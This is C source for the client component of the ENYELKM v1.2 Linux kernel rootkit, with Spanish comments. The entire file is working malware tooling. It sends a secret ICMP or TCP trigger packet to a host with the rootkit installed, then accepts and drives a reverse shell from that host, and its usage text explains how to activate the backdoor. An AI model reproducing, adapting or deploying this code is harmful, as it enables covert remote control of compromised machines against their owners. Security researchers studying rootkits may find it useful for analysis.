/*
 * ENYELKM v1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe && David Reguera
 * < raise@enye-sec.org
 *   davidregar@yahoo.es
 *   http://www.enye-sec.org >
 */

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "config.h"


int enviar_icmp(char *ipdestino, unsigned short puerto);
int enviar_tcp(char *ipdestino, unsigned short dpuerto, unsigned short puerto);
int test_args(int argc, char *argv[]);
void show_instr(char *name);


int main(int argc, char *argv[])
{
struct sockaddr_in dire;
unsigned short puerto, dpuerto;
int soc, soc2, modo;
fd_set s_read;
unsigned char tmp;


if ((modo = test_args(argc, argv)) == -1)
	exit(modo);

if ((modo == 1) && (argc > 3))
	puerto = (unsigned short) atoi(argv[3]);
else
	puerto = 8822;

if ((modo == 2) && (argc > 4))
    puerto = (unsigned short) atoi(argv[4]);
else
    puerto = 8822;


if ((soc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
    printf("error al crear el socket.\n");
    exit(-1);
    }

bzero((char *) &dire, sizeof(dire));

dire.sin_family = AF_INET;
dire.sin_port = htons(puerto);
dire.sin_addr.s_addr = htonl(INADDR_ANY);

while(bind(soc, (struct sockaddr *) &dire, sizeof(dire)) == -1)
	dire.sin_port = htons(++puerto);

listen(soc, 5);

printf("\n* Lanzando reverse_shell:\n\n");
fflush(stdout);

if (modo == 1)
	enviar_icmp(argv[2], puerto);
else
	{
	dpuerto = (unsigned short) atoi(argv[3]);
	enviar_tcp(argv[2], dpuerto, puerto);
	}

printf("Esperando shell en puerto %d (puede tardar unos segundos) ...\n", (int) puerto);
fflush(stdout);
soc2 = accept(soc, NULL, 0);
printf("lanzando shell ...\n\n");
printf("id\n");
fflush(stdout);
write(soc2, "id\n", 3);


while(1)
    {
    FD_ZERO(&s_read);
	FD_SET(0, &s_read);
    FD_SET(soc2, &s_read);

    select((soc2 > 0 ? soc2+1 : 0+1), &s_read, 0, 0, NULL);

    if (FD_ISSET(0, &s_read))
        {
        if (read(0, &tmp, 1) == 0)
            break;
        write(soc2, &tmp, 1);
        }

    if (FD_ISSET(soc2, &s_read))
        {
        if (read(soc2, &tmp, 1) == 0)
            break;
        write(1, &tmp, 1);
        }

    } /* fin while(1) */


exit(0);

} /***** fin de main() *****/


int enviar_icmp(char *ipdestino, unsigned short puerto)
{
int soc, n, tot;
long sum;
unsigned short *p;
struct sockaddr_in adr;
unsigned char pqt[4096];
struct iphdr *ip = (struct iphdr *) pqt;
struct icmphdr *icmp = (struct icmphdr *)(pqt + sizeof(struct iphdr));
char *data = (char *)(pqt + sizeof(struct iphdr) + sizeof(struct icmphdr));

bzero(pqt,4096);
bzero(&adr, sizeof(adr));
strcpy(data, ICMP_CLAVE);
p = (unsigned short *)((void *)(data + strlen(data)));
*p = puerto;

tot = sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(ICMP_CLAVE) + sizeof(puerto);

if((soc = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
	{
	perror("Error al crear el socket.\n");
	exit(-1);
	}

adr.sin_family = AF_INET;
adr.sin_port = 0;
adr.sin_addr.s_addr = inet_addr(ipdestino);

ip->ihl = 5;
ip->version = 4;
ip->id = rand() % 0xffff;
ip->ttl = 0x40;
ip->protocol = 1;
ip->tos = 0;
ip->tot_len = htons(tot);
ip->saddr = 0;
ip->daddr = inet_addr(ipdestino);

icmp->type = ICMP_ECHO;
icmp->code = 0;
icmp->un.echo.id = getpid() && 0xffff;
icmp->un.echo.sequence = 0;

printf("Enviando ICMP ...\n");
fflush(stdout);

n = sizeof(struct icmphdr) + strlen(ICMP_CLAVE) + sizeof(puerto);
icmp->checksum = 0;
sum = 0;
p = (unsigned short *)(pqt + sizeof(struct iphdr));

while (n > 1)
	{
	sum += *p++;
	n -= 2;
	}

if (n == 1)
	{
	unsigned char pad = 0;
	pad = *(unsigned char *)p;
	sum += (unsigned short) pad;
	}

sum = ((sum >> 16) + (sum & 0xffff));
icmp-> checksum = (unsigned short) ~sum;

if ((n = (sendto(soc, pqt, tot, 0, (struct sockaddr*) &adr,
    sizeof(adr)))) == -1)
	{
	perror("Error al enviar datos.\n");
	exit(-1);
	}
	

return(0);

} /********* fin de enviar_icmp() ********/	


int enviar_tcp(char *ipdestino, unsigned short dpuerto, unsigned short puerto)
{
char buf[256], *p;
struct sockaddr_in dire;
int soc;

if((soc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
    perror("Error al crear el socket.\n");
    exit(-1);
    }

bzero((void *) &dire, sizeof(dire));
dire.sin_family = AF_INET;
dire.sin_port = htons(dpuerto);
dire.sin_addr.s_addr = inet_addr(ipdestino);

if (connect(soc, (struct sockaddr *) &dire, sizeof(dire)) == -1)
    {
    perror("Error al conectar al puerto destino.\n");
    exit(-1);
    }

bzero(buf, sizeof(buf));
strcpy(buf, TCP_CLAVE);
p = buf+strlen(TCP_CLAVE);
*((unsigned short *)p) = puerto;

printf("Enviando firma TCP al puerto %d ...\n", dpuerto);
fflush(stdout);

write(soc, buf, strlen(TCP_CLAVE) + sizeof(unsigned short));
close(soc);

return(0);

} /******** fin de enviar_tcp() ********/


int test_args(int argc, char *argv[])
{
int modo;

if (argc < 3)
	{
	show_instr(argv[0]);
	return(-1);
	}

if (!strcmp(argv[1],"-icmp"))
	modo = 1;
else
	if (!strcmp(argv[1],"-tcp"))
		modo = 2;
	else
		{
		show_instr(argv[0]);
		return(-1);
		}

if((modo == 1) && geteuid())
    {
    printf("\nNecesitas ser root (para usar raw sockets).\n\n");
    return(-1);
    }

if ((modo == 2) && (argc < 4))
    {
	show_instr(argv[0]);
    return(-1);
    }

return(modo);

} /******* fin test_args() ********/


void show_instr(char *name)
{

printf("\nPrograma para activar el acceso remoto del enyelkm v1.2:\n\n");
printf("Peticion ICMP: %s -icmp ip_destino [puerto_shell]\n", name);
printf("Peticion TCP: %s -tcp ip_destino puerto_destino [puerto_shell]\n\n", name);
printf("- ip_destino: ip de la maquina con enyelkm instalado\n");
printf("- puerto_shell: puerto local en el que se recibira la shell (x def: 8822)\n");
printf("- puerto_destino: puerto abierto al que se enviara la firma TCP (21, 80, ...)\n\n");

} /******** fin show_instr() *******/


/* EOF */
